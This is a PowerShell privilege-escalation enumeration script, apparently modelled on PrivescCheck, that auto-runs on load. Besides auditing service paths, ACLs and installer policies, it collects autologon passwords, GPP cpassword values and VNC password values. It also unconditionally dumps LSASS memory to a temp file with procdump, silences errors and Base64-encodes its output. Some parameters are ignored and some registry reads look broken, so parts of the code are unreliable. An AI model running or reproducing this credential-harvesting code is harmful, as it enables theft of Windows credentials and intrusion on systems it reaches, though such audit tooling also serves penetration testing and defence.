<#
.SYNOPSIS
    Modular implementation of PrivescCheck security checks in the style of Get-NetworkInfo.ps1.
.DESCRIPTION
    Each original check is refactored into standalone functions returning PSCustomObjects
    with fields: `Check`, `Name`, `Value`. The main function, `Invoke-NetworkPrivescChecks`, aggregates them,
    supports CSV/JSON output and Base64 encoding.
.PARAMETER OutputFormat
    Desired output format: CSV or JSON (default: CSV).
.PARAMETER Extended
    Include extended checks.
.PARAMETER Audit
    Include audit checks.
.PARAMETER Experimental
    Include experimental checks.
.PARAMETER Risky
    Include risky checks.
.PARAMETER ShowConsole
    Decode Base64 and write clear output to the console.
#>
Param(
    [ValidateSet('CSV','JSON')]
    [string]$OutputFormat = 'CSV',
    [switch]$Extended,
    [switch]$Audit,
    [switch]$Experimental,
    [switch]$Risky,
    [switch]$ShowConsole
)

# Suppress non-terminating errors
$ErrorActionPreference = 'SilentlyContinue'

# -- Check Functions --
function Get-LocalAdmins {
    try {
        Get-LocalGroupMember -Group 'Administrators' -ErrorAction Stop |
        ForEach-Object { [PSCustomObject]@{ Check='LocalAdmins'; Name=$_.Name; Value=$_.ObjectClass } }
    } catch { }
}

function Get-UnquotedServicePaths {
    try {
        Get-CimInstance Win32_Service |
        Where-Object { $_.PathName -match '\s' -and $_.PathName -notmatch '^".*"' } |
        ForEach-Object { [PSCustomObject]@{ Check='UnquotedServicePath'; Name=$_.Name; Value=$_.PathName } }
    } catch { }
}

function Get-WeakServicePermissions {
    $out = @()
    try {
        Get-CimInstance Win32_Service | ForEach-Object {
            $acl = Get-Acl "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\$($_.Name)"
            $acl.Access | Where-Object { $_.IdentityReference -match 'Users|Everyone' -and $_.RegistryRights -match 'Write|FullControl' } |
            ForEach-Object { $out += [PSCustomObject]@{ Check='WeakServicePermissions'; Name=$_.IdentityReference; Value="$($_.RegistryRights) on $($_.Path)" } }
        }
    } catch { }
    return $out
}

function Get-ScheduledTasks {
    try {
        Get-ScheduledTask |
        ForEach-Object { [PSCustomObject]@{ Check='ScheduledTasks'; Name=$_.TaskName; Value=$_.TaskPath } }
    } catch { }
}

function Get-InterestingFiles {
    $paths = @(
        'C:\Windows\System32\drivers\etc\hosts',
        'C:\Windows\System32\drivers\etc\services',
        'C:\Windows\Tasks'
    )
    $out = @()
    foreach ($p in $paths) {
        try {
            if (Test-Path $p) {
                $out += [PSCustomObject]@{ Check='InterestingFiles'; Name=$p; Value=(Get-Item $p).Length }
            }
        } catch { }
    }
    return $out
}

function Get-AutoLogon {
    try {
        $keys = @{ User='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName';
                   Domain='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultDomainName';
                   Password='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword' }
        $user = Get-ItemPropertyValue -Path $keys.User -Name .
        $dom  = Get-ItemPropertyValue -Path $keys.Domain -Name .
        $pwd  = Get-ItemPropertyValue -Path $keys.Password -Name .
        [PSCustomObject]@{ Check='AutoLogon'; Name='Credentials'; Value="User=$user;Domain=$dom;Password=$pwd" }
    } catch { }
}

function Get-UnattendedInstalls {
    try {
        $key = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Setup\OOBE'
        $props = Get-ItemProperty -Path $key -ErrorAction Stop
        if ($props.PSObject.Properties.Match('UnattendFile')) {
            [PSCustomObject]@{ Check='UnattendedInstalls'; Name='UnattendFile'; Value=$props.UnattendFile }
        }
    } catch { }
}

function Get-AlwaysInstallElevated {
    $out = @()
    $paths = @('HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer','HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer')
    foreach ($p in $paths) {
        try {
            $v = Get-ItemPropertyValue -Path $p -Name 'AlwaysInstallElevated'
            $out += [PSCustomObject]@{ Check='AlwaysInstallElevated'; Name=$p; Value=$v }
        } catch { }
    }
    return $out
}

function Get-RegistryDebugger {
    $out = @()
    try {
        Get-ChildItem -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' |
        Where-Object { $_.PSIsContainer } | ForEach-Object {
            $dbg = Get-ItemPropertyValue -Path $_.PSPath -Name 'Debugger'
            if ($dbg) { $out += [PSCustomObject]@{ Check='RegistryDebugger'; Name=$_.PSChildName; Value=$dbg } }
        }
    } catch { }
    return $out
}

function Get-DriverFilePermissions {
    $out = @()
    try {
        Get-CimInstance Win32_SystemDriver | ForEach-Object {
            $path = $_.PathName -replace '"',''
            if (Test-Path $path) {
                $acl  = Get-Acl $path
                $weak = $acl.Access | Where-Object { $_.IdentityReference -match 'Users|Everyone' -and $_.FileSystemRights -match 'Write|FullControl' }
                foreach ($ace in $weak) {
                    $out += [PSCustomObject]@{ Check='DriverFilePermissions'; Name=$ace.IdentityReference; Value="$($ace.FileSystemRights) on $path" }
                }
            }
        }
    } catch { }
    return $out
}

function Get-VSSWriters {
    try {
        vssadmin list writers | Select-String 'Writer name' | ForEach-Object {
            $parts = $_.ToString().Split(':')
            [PSCustomObject]@{ Check='VSSWriters'; Name=$parts[0]; Value=$parts[1].Trim() }
        }
    } catch { }
}

function Get-CurrentUserGroups {
    try {
        whoami /groups | Where-Object { $_ -match 'S-1-' } | ForEach-Object {
            $cols = ($_ -split '\s{2,}')
            [PSCustomObject]@{ Check='CurrentUserGroups'; Name=$cols[-1]; Value=$cols[0] }
        }
    } catch { }
}

function Get-GPPPasswords {
    $out = @()
    try {
        Get-ChildItem -Path 'C:\Windows\SYSVOL' -Include 'Groups.xml','Services.xml','ScheduledTasks.xml' -Recurse |
        ForEach-Object {
            $xml   = [xml](Get-Content $_)
            $nodes = $xml.DocumentElement.SelectNodes('//*[@cpassword]')
            foreach ($n in $nodes) { $out += [PSCustomObject]@{ Check='GPPPassword'; Name=$_.FullName; Value=$n.cpassword } }
        }
    } catch { }
    return $out
}

function Get-LsassCredDump {
    try {
        $proc = Get-Process lsass
        $dump = 'C:\Windows\Temp\lsass.dmp'
        procdump -ma $proc.Id $dump | Out-Null
        [PSCustomObject]@{ Check='LsassCredDump'; Name='DumpFile'; Value=$dump }
    } catch { }
}

function Get-RealVNCSettings {
    $out = @()
    $keys = @('HKLM:\SOFTWARE\RealVNC\WinVNC4','HKLM:\SOFTWARE\WOW6432Node\RealVNC\WinVNC4')
    foreach ($k in $keys) {
        try {
            if (Test-Path $k) {
                $p = Get-ItemProperty -Path $k
                foreach ($n in @('Password','Password64','AuthMode')) {
                    if ($p.PSObject.Properties.Match($n)) { $out += [PSCustomObject]@{ Check='RealVNC'; Name="$k\$n"; Value=$p.$n } }
                }
            }
        } catch { }
    }
    return $out
}

function Get-TightVNCSettings {
    $out = @()
    $keys = @('HKLM:\SOFTWARE\TightVNC\Server','HKLM:\SOFTWARE\WOW6432Node\TightVNC\Server')
    foreach ($k in $keys) {
        try {
            if (Test-Path $k) {
                $p = Get-ItemProperty -Path $k
                foreach ($n in @('PasswordEnc','UseRegistryAuthentication','PortNumber')) {
                    if ($p.PSObject.Properties.Match($n)) { $out += [PSCustomObject]@{ Check='TightVNC'; Name="$k\$n"; Value=$p.$n } }
                }
            }
        } catch { }
    }
    return $out
}

function Get-VNCServices {
    $out = @()
    try {
        Get-Service | Where-Object { $_.Name -match 'vnc' -or $_.DisplayName -match 'vnc' } | ForEach-Object {
            $out += [PSCustomObject]@{ Check='VNCService'; Name=$_.Name; Value=$_.Status }
        }
    } catch { }
    return $out
}

function Invoke-NetworkPrivescChecks {
    [CmdletBinding()]
    param(
        [ValidateSet('CSV','JSON')][string]$OutputFormat = 'CSV',
        [switch]$Extended,
        [switch]$Audit,
        [switch]$Experimental,
        [switch]$Risky,
        [switch]$ShowConsole
    )

    $results = @()
    $results += Get-LocalAdmins
    $results += Get-UnquotedServicePaths
    $results += Get-WeakServicePermissions
    $results += Get-ScheduledTasks
    $results += Get-InterestingFiles
    $results += Get-AutoLogon
    $results += Get-UnattendedInstalls
    $results += Get-AlwaysInstallElevated
    $results += Get-RegistryDebugger
    $results += Get-DriverFilePermissions
    $results += Get-VSSWriters
    $results += Get-CurrentUserGroups
    $results += Get-GPPPasswords
    $results += Get-LsassCredDump
    $results += Get-RealVNCSettings
    $results += Get-TightVNCSettings
    $results += Get-VNCServices

    if ($OutputFormat -eq 'JSON') {
        $outData = $results | ConvertTo-Json -Depth 4 | Out-String
    } else {
        $outData = $results | ConvertTo-Csv -NoTypeInformation | Out-String
    }

    $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($outData))

    if ($ShowConsole) {
        [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64)) | Write-Host
    }

    return $b64
}

# Auto-execution entry point
Invoke-NetworkPrivescChecks